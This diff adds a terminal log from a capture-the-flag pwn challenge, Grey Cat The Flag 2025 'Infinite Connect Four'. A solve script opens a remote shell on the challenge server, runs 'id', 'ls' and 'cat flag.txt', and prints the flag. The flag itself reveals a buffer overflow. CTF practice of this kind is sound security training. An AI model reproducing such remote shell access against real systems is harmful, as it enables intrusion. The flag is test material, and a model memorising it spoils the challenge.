@@ -1,0 +1,11 @@
+mito@mito-virtual-machine:~/CTF/Grey_Cat_The_Flag_2025/Pwn_Infinite_Connect_Four/dist-infinite_connect_four$ python3 solve.py r
+[+] Opening connection to challs.nusgreyhats.org on port 33102: Done
+[*] Switching to interactive mode
+erm... what the sigma?
+$ id
+uid=1000 gid=1000 groups=1000
+$ ls
+flag.txt
+run
+$ cat flag.txt
+grey{i_l0v3_mE_s0M3_bUfFeR_0v3rFloWS}[*] Got EOF while reading in interactive
